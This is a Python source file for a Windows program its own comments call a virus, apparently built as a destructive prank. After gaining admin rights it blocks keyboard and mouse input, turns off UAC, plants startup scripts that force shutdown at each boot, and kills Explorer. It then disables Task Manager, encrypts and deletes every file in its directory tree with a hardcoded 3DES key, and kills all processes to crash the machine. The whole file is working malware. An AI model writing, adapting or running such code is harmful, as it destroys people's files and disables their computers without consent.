from __future__ import print_function
import tkinter.messagebox
import tkinter as tk
from tkinter.messagebox import *
from tkinter import messagebox
import random
import threading
from threading import Thread
import time
import os
import subprocess
import ctypes
import sys
from subprocess import run #命令执行模块
from playsound import playsound
from ctypes import windll
from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad
import winreg
import cv2


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    n = 0
    w = '''你的电脑正在被攻击！
    请不要关闭正在运行的程序，否则会丢失信息
    点击‘确定’进行下一步操作'''
    f = '''你的电脑正在被攻击！
    请不要关闭正在运行的程序，否则会丢失信息
    攻击路径：C://Users/appdata/dghgha/langtgdwqi/poquue/sittings/virus.exe'''
    # tkinter.messagebox.askyesno('python3.7', '是否要打开此程序？')
    # tkinter.messagebox.showinfo('提示', '你一定要想好了哈')
    # tkinter.messagebox.askyesno('提示', '最后一次警告！你真的要打开吗？')
    tkinter.messagebox.showinfo('骂谁罕见呢？', '现在退出还来得及')
    # 屏蔽键鼠，说明：需要管理员权限
    user32 = windll.LoadLibrary("C:\\Windows\\System32\\user32.dll")
    user32.BlockInput(True)  # 该功能需要管理员权限
    print('键鼠已屏蔽！')
    # user32.BlockInput(False)  # 该功能需要管理员权限
    #print('键鼠屏蔽已取消！')

    def get_resource_path(relative_path):
        if hasattr(sys, '_MEIPASS'):
            return os.path.join(sys._MEIPASS, relative_path)
        return os.path.join(os.path.abspath("."), relative_path)


    # 替换为您实际的视频文件路径
    hanjian1_path = get_resource_path('mp4/hanjian1.MP3')
    hanjian2_path = get_resource_path('mp4/hanjian2.MP3')
    hanjian3_path = get_resource_path('mp4/hanjian3.MP3')
    txt_path = get_resource_path('mp4/luzao.txt')
    icon_path = get_resource_path('mp4/luzao.ico')
    screen_path = get_resource_path('mp4/blurred Screen/blurred screen.exe')
    hj_path =  get_resource_path('mp4/hj.ico')
    haojing_mp4_path = get_resource_path('mp4/haojing_virus.mp4')
    haojing_mp3_path = get_resource_path('mp4/haojing_virus.MP3')
    # video_path = 'mp4/king.mp4'

    def close_uac():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"修改注册表时出错: {e}")

    def shuTdoWn():
        '''开机即关机'''
        # 定义要创建的.bat 文件的内容
        bat_content = "shutdown -s -t 60"  # 相关的快点就该数字(秒)
        # 获取 shell:startup 目录的路径
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        # 指定要创建的.bat 文件的路径和文件名
        bat_file_path = os.path.join(startup_path, 'shutdown.bat')
        # 创建并写入内容到.bat 文件
        with open(bat_file_path, "w") as file:
            file.write(bat_content)

    def GenShin_DownLoad():
        '''自动下载原神'''
        # 定义要创建的.bat 文件的内容
        bat_content = '''
        @echo off
        %1(start /min cmd.exe /c %0 :&exit)
        set curpath=%~dp0 
        cd /d %curpath%
        set exename=yuanshen.exe
        set downurl=https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default
        powershell curl -o "%exename%" "%downurl%"
        '''
        # 获取 shell:startup 目录的路径
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        # 指定要创建的.bat 文件的路径和文件名
        bat_file_path = os.path.join(startup_path, 'genshin.bat')
        # 创建并写入内容到.bat 文件
        with open(bat_file_path, "w") as file:
            file.write(bat_content)

    # 这些操作要放在终止资源管理器进程之前，否则会失效
    os.system('shutdown -s -t 3600')
    shuTdoWn()
    GenShin_DownLoad()
    time.sleep(3)
    close_uac()  # 关闭uac功能，重开后不需要询问管理员

    def close_explorer():
        run('taskkill /F /IM explorer.exe')  # 终止资源管理器进程
    time.sleep(1.5)
    close_explorer()  # 关闭资源管理器(一打开就关)

    def callback():
        pass

    def boom2():
        window = tk.Tk()
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        a = random.randrange(0, width)
        b = random.randrange(0, height)
        window.iconbitmap(icon_path)
        window.title('骂谁罕见！')
        window.geometry("225x225" + "+" + str(a) + "+" + str(b))

        # 从外部文件读取内容
        with open(txt_path, "r") as file:  # txt_path 为外部文件的路径
            text = file.read()

        tk.Label(window, text=text, bg='blue',
                 font=('宋体', 3), width=200, height=200).pack()
        window.protocol("WM_DELETE_WINDOW", callback)
        window.mainloop()


    # 假设音频文件都在一个文件夹中
    audio_files = [hanjian1_path,hanjian2_path,hanjian3_path]  # 替换为您的音频文件路径
    def boom3():

        # 随机选择一个音频文件
        random_audio = random.choice(audio_files)
        playsound(random_audio)


    def haojing1():
        cap = cv2.VideoCapture(haojing_mp4_path)
        while True:
            ret, frame = cap.read()
            if not ret:
                break

            cv2.namedWindow('frame', cv2.WINDOW_NORMAL)
            cv2.setWindowProperty('frame', cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
            cv2.imshow('frame', frame)

            if cv2.waitKey(16) & 0xFF == ord('q'):
                break

        cap.release()
        cv2.destroyAllWindows()


    def haojing2():
        playsound(haojing_mp3_path)

    def encrypt_file(file_path):
        # 读取文件内容
        with open(file_path, 'rb') as file:
            content = file.read()

        # 填充数据
        content = pad(content, 8)

        # 3DES 加密
        key = b'IAMLOLI123123123asdfjklh'  # 这里需要一个有效的 24 字节密钥
        cipher = DES3.new(key, DES3.MODE_ECB)
        encrypted_content = cipher.encrypt(content)

        # 修改文件后缀名为".hanjian"
        new_file_path = file_path + '.exe'

        # 覆盖源文件
        with open(new_file_path, 'wb') as file:
            file.write(encrypted_content)

        # 删除原文件
        os.remove(file_path)


    def encrypt_directory_recursive(directory_path):
        # 遍历目录下的所有文件和子目录
        for root, dirs, files in os.walk(directory_path):
            for file_name in files:
                file_path = os.path.join(root, file_name)

                # 排除当前运行的脚本文件，仅处理其他文件
                if file_path != current_script:
                    encrypt_file(file_path)

    def encrypt_current_directory():
        # 获取当前程序所在目录
        current_dir = os.getcwd()

        # 获取当前脚本文件的绝对路径
        global current_script
        current_script = os.path.abspath(sys.argv[0])

        # 加密当前目录及其子目录中的所有文件
        encrypt_directory_recursive(current_dir)

    def reg_disable_taskmgr(dwDisable=True):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            value = int(dwDisable)
            winreg.SetValueEx(key, "DisableTaskMgr", 1, winreg.REG_DWORD, value.to_bytes(4, byteorder='little'))
            winreg.CloseKey(key)
        except Exception as e:
            print(f"An error occurred: {e}")

    def disable_task_manager():
        # 注册表路径
        registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        # 注册表项名
        registry_name = "DisableTaskMgr"
        # 要设置的值（1 表示禁用任务管理器，0 表示启用）
        value = 1
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, str(value))
            winreg.CloseKey(reg_key)
        except WindowsError as e:
            print(f"设置注册表时发生错误: {e}")

    def set_exe_icon():
        try:
            # 获取当前 Python 脚本的路径
            current_path = os.path.abspath(sys.argv[0])
            # 从路径中提取目录部分
            current_dir = os.path.dirname(current_path)
            # 构建图标文件的路径，假设图标文件在当前目录下的 mp4/favicon.ico
            sys_icon_path = os.path.join(current_dir, hj_path)

            # 打开相关的注册表项
            key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, '.exe', 0, winreg.KEY_SET_VALUE)
            winreg.SetValue(key, '', winreg.REG_SZ, 'exefile')

            key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, 'exefile\\DefaultIcon', 0, winreg.KEY_SET_VALUE)
            winreg.SetValue(key, '', winreg.REG_SZ, sys_icon_path)

            print("修改默认图标成功！")
        except Exception as e:
            print(f"修改默认图标失败：{str(e)}")

    window = tkinter.Tk()
    window.withdraw()  # 隐藏默认的 tk 窗口

    time.sleep(1)
    # tkinter.messagebox.showwarning('warning', w)

    threads1 = []
    threads2 = []
    threads3 = []

    for i in range(15):
        t0 = threading.Thread(target=boom3)
        threads3.append(t0)
        time.sleep(0.1)
        threads3[i].start()  # 线程放歌
        threads1.clear()  # 每次外层循环前清空 threads1 列表
        for j in range(15):
            t1 = threading.Thread(target=boom2)
            threads1.append(t1)
            #time.sleep(0.05)
            threads1[j].start()  # 线程放露早

    time.sleep(5)

    # 解除屏蔽键鼠
    user32.BlockInput(False)  # 该功能需要管理员权限
    print('键鼠屏蔽已取消！')

    Thread(target=haojing2).start()
    haojing1() #先放歌再放视频，视频不开多线程，这样可以放完视频再继续后面的


    # 屏蔽键鼠，说明：需要管理员权限
    user32.BlockInput(True)  # 该功能需要管理员权限
    print('键鼠已屏蔽！')

    time.sleep(3)

    for i in range(1):#播放昊京
        time.sleep(2)
        set_exe_icon() #修改exe图标
        reg_disable_taskmgr() # 屏蔽任务管理器
        disable_task_manager()# 屏蔽任务管理器
        os.startfile(screen_path) #打开C的花屏
        encrypt_current_directory()  # 3DES加密当前目录所有文件
        time.sleep(3)

    for h in range(1):
        # tkinter.messagebox.showwarning('warning', f)
        #time.sleep(0.2)
        # tkinter.messagebox.showinfo('提示', 'Goodbye')
        #time.sleep(1)
        #time.sleep(5)
        # '''
        if is_admin():
            os.system("Taskkill /fi \"pid ge 1\" /f")  # Taskkill /fi "pid ge 1" /f 杀死所有进程，管理员权限cmd直接蓝屏
            input()
        else:
            if sys.version_info[0] == 3:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, __file__, None, 1)
            else:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    # '''
else:
    if sys.version_info[0] == 3:
    	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    # 打包命令pyinstaller --add-data="mp4:mp4" -wF -i .\favicon.ico  .\Virus.py